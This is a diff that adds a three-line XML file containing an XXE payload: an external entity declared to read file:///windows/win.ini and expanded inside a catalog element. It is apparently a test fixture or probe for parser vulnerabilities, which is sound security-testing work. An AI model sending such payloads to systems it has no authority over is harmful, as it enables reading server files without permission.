@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE catalog [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]>
+<catalog>&xxe;</catalog>
